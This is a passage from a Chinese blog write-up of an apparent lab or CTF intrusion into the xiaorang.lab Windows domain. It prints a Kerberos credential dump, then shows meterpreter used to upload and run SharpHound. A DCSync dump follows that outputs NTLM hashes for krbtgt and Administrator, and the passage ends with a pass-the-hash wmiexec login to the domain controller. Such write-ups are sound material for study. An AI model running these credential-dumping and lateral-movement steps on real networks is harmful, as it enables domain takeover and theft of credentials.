+</span></span><span class="line"><span class="cl">                           d7 0b <span class="m">38</span> <span class="nb">cd</span> <span class="m">36</span> 5d 9a ed c1 <span class="m">73</span> <span class="m">08</span> b6 6f d7 <span class="m">21</span> 5b <span class="m">47</span> b2 ec ee 0c 4d <span class="m">22</span> 9a b4 e8 ac <span class="m">73</span> 9a b0 <span class="m">90</span> <span class="m">12</span> ad <span class="m">34</span> 6c <span class="m">95</span> ee 2c d
+</span></span><span class="line"><span class="cl">                          <span class="m">8</span> <span class="m">91</span> ec 6f d7 <span class="m">55</span> ed f4 b7 de <span class="m">37</span> <span class="m">88</span> <span class="m">16</span> ea <span class="m">91</span> 5d f5 5b da 3f <span class="m">66</span> <span class="m">30</span> <span class="m">87</span> <span class="m">35</span> de <span class="m">57</span> 1e 5a <span class="m">42</span> f3 1c <span class="m">31</span> <span class="m">20</span> 2a <span class="m">94</span> 1f 8c 8d <span class="m">98</span>
+</span></span><span class="line"><span class="cl">                          <span class="m">16</span> d1 ec f5 1b ba c7 <span class="m">79</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">kerberos <span class="nv">credentials</span>
+</span></span><span class="line"><span class="cl"><span class="o">====================</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Username        Domain        Password
+</span></span><span class="line"><span class="cl">--------        ------        --------
+</span></span><span class="line"><span class="cl"><span class="o">(</span>null<span class="o">)</span>          <span class="o">(</span>null<span class="o">)</span>        <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">xiaorang-win7$  XIAORANG.LAB  3c <span class="m">70</span> e3 <span class="m">19</span> a1 <span class="m">37</span> fe <span class="m">66</span> <span class="m">39</span> ed cb ba 0e ec 4c f3 b7 c7 b1 <span class="m">86</span> <span class="m">42</span> fb <span class="m">08</span> <span class="m">84</span> 5c <span class="m">06</span> aa 3d f2 3b <span class="m">10</span> <span class="m">41</span> 0f 8c cc 6b <span class="m">64</span> <span class="m">7</span>
+</span></span><span class="line"><span class="cl">                              e 0d <span class="m">05</span> <span class="m">81</span> <span class="m">21</span> c5 <span class="m">85</span> 8b <span class="m">53</span> <span class="m">92</span> <span class="m">95</span> e0 5d <span class="m">42</span> <span class="m">77</span> <span class="m">31</span> <span class="m">69</span> ba b1 <span class="m">42</span> 3f 1d ea <span class="m">73</span> <span class="m">72</span> <span class="m">88</span> be <span class="m">48</span> c6 <span class="m">93</span> ab d2 f8 <span class="nb">fc</span> a6 <span class="m">25</span> <span class="m">16</span> fd
+</span></span><span class="line"><span class="cl">                               <span class="m">11</span> 2c 7b 6e 7b <span class="m">16</span> c5 5e <span class="m">86</span> <span class="m">11</span> <span class="m">30</span> <span class="m">35</span> <span class="m">27</span> <span class="m">80</span> <span class="m">09</span> e3 <span class="m">05</span> 6a 5f <span class="m">59</span> <span class="m">57</span> e9 <span class="m">85</span> 3a d7 <span class="m">17</span> <span class="m">34</span> <span class="m">67</span> 5d <span class="m">69</span> b1 <span class="m">80</span> <span class="m">67</span> 7f ca 9c <span class="m">60</span>
+</span></span><span class="line"><span class="cl">                              d6 e8 <span class="m">88</span> <span class="m">63</span> 2c <span class="m">42</span> 1b 0b f1 cc e8 4c c0 <span class="m">31</span> b3 <span class="m">64</span> <span class="m">56</span> <span class="m">29</span> cc ad 4a <span class="m">77</span> <span class="m">91</span> <span class="m">79</span> <span class="m">67</span> <span class="m">27</span> 2f ec <span class="m">03</span> 0e d7 <span class="m">61</span> <span class="m">93</span> <span class="m">27</span> <span class="m">02</span> <span class="m">04</span> ff <span class="m">8</span>
+</span></span><span class="line"><span class="cl">                              <span class="m">5</span> a7 b3 e9 e6 <span class="m">47</span> d7 0b <span class="m">38</span> <span class="nb">cd</span> <span class="m">36</span> 5d 9a ed c1 <span class="m">73</span> <span class="m">08</span> b6 6f d7 <span class="m">21</span> 5b <span class="m">47</span> b2 ec ee 0c 4d <span class="m">22</span> 9a b4 e8 ac <span class="m">73</span> 9a b0 <span class="m">90</span> <span class="m">12</span>
+</span></span><span class="line"><span class="cl">                               ad <span class="m">34</span> 6c <span class="m">95</span> ee 2c d8 <span class="m">91</span> ec 6f d7 <span class="m">55</span> ed f4 b7 de <span class="m">37</span> <span class="m">88</span> <span class="m">16</span> ea <span class="m">91</span> 5d f5 5b da 3f <span class="m">66</span> <span class="m">30</span> <span class="m">87</span> <span class="m">35</span> de <span class="m">57</span> 1e 5a <span class="m">42</span> f3 1c
+</span></span><span class="line"><span class="cl">                              <span class="m">31</span> <span class="m">20</span> 2a <span class="m">94</span> 1f 8c 8d <span class="m">98</span> <span class="m">16</span> d1 ec f5 1b ba c7 <span class="m">79</span>
+</span></span><span class="line"><span class="cl">xiaorang-win7$  XIAORANG.LAB  <span class="o">(</span>null<span class="o">)</span>
+</span></span></code></pre></div><p>上传<code>SharpHound.exe</code>收集有关领域内的信息</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">meterpreter &gt; upload <span class="s2">&#34;/Users/lnhsec/Desktop/Sec/redteam/tools/内网/SharpHound-v2.5.8/SharpHound.exe&#34;</span> <span class="s2">&#34;C:/SharpHound.exe&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">meterpreter &gt; shell
+</span></span><span class="line"><span class="cl">chcp <span class="m">65001</span>
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> C:/
+</span></span><span class="line"><span class="cl">SharpHound.exe -c all
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">meterpreter &gt; download <span class="s2">&#34;C:/20241027154232_BloodHound.zip&#34;</span> <span class="s2">&#34;/Users/lnhsec/Desktop/&#34;</span>
+</span></span></code></pre></div><p>BloodHound 分析:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -L https://ghst.ly/getbhce <span class="p">|</span> docker compose -f - up
+</span></span><span class="line"><span class="cl">8080端口
+</span></span><span class="line"><span class="cl">账号admin
+</span></span></code></pre></div><p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202410271735018.png" alt="image.png"></p>
+<p>因为这台机器有 DCSync 的权限, 所以能直接从域控上导出 Hash。利用<code>DCSync</code>域内<code>dump</code>所有用户的<code>hash</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">meterpreter &gt; kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv
+</span></span><span class="line"><span class="cl"><span class="o">[</span>DC<span class="o">]</span> <span class="s1">&#39;xiaorang.lab&#39;</span> will be the domain
+</span></span><span class="line"><span class="cl"><span class="o">[</span>DC<span class="o">]</span> <span class="s1">&#39;DC01.xiaorang.lab&#39;</span> will be the DC server
+</span></span><span class="line"><span class="cl"><span class="o">[</span>DC<span class="o">]</span> Exporting domain <span class="s1">&#39;xiaorang.lab&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>rpc<span class="o">]</span> Service  : ldap
+</span></span><span class="line"><span class="cl"><span class="o">[</span>rpc<span class="o">]</span> AuthnSvc : GSS_NEGOTIATE <span class="o">(</span>9<span class="o">)</span>
+</span></span><span class="line"><span class="cl">502	krbtgt	fb812eea13a18b7fcdb8e6d67ddc205b	<span class="m">514</span>
+</span></span><span class="line"><span class="cl">1106	Marcus	e07510a4284b3c97c8e7dee970918c5c	<span class="m">512</span>
+</span></span><span class="line"><span class="cl">1107	Charles	f6a9881cd5ae709abb4ac9ab87f24617	<span class="m">512</span>
+</span></span><span class="line"><span class="cl">1000	DC01$	4450359029240b6aee687552fab52618	<span class="m">532480</span>
+</span></span><span class="line"><span class="cl">500	Administrator	10cf89a850fb1cdbe6bb432b859164c8	<span class="m">512</span>
+</span></span><span class="line"><span class="cl">1104	XIAORANG-OA01$	2408e055546207b9dcaa5230c2f0126a	<span class="m">4096</span>
+</span></span><span class="line"><span class="cl">1108	XIAORANG-WIN7$	a4608f945dbe2811e2848e0ce1d6cdfe	<span class="m">4096</span>
+</span></span></code></pre></div><p>利用<code>impacket-wmiexec</code>进行横向移动来访问域控制，在<code>C:\Users\Administrator\flag\flag03.txt</code>中得到第三部分<code>flag</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python wmiexec.py xiaorang.lab/administrator@172.22.1.2 -hashes :10cf89a850fb1cdbe6bb432b859164c8
+</span></span></code></pre></div><p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202410271735785.png" alt="image.png"></p>
+
+    </article>
+
+    
+    <div class="comments">
+  <div class="giscus"></div>
+</div>
+<script 
+  src="https://giscus.app/client.js" 
+  data-repo="dlzmoe/blog" 
+  data-repo-id="R_kgDOJkJvtw"
+  data-category="Announcements" 
+  data-category-id="DIC_kwDOJkJvt84CX9d6" 
+  data-mapping="url" 
+  data-strict="0"
+  data-reactions-enabled="1" 
+  data-emit-metadata="1" 
+  data-input-position="top" 
+  data-theme="light_protanopia"
+  data-lang="zh-CN" 
+  data-loading="lazy" 
+  crossorigin="anonymous" 
+  async>
+</script>
+
+    
+    
+  </section>
+  <footer class="footer">
+  <p>© 2024 - 2024 Powered by
+    <a href="https://github.com/w0s1np" target="_blank">Github</a>
+    / <a href="/index.xml" target="_blank">RSS</a>
+  </p>
+</footer>
+
+
+</body>
+
+</html>
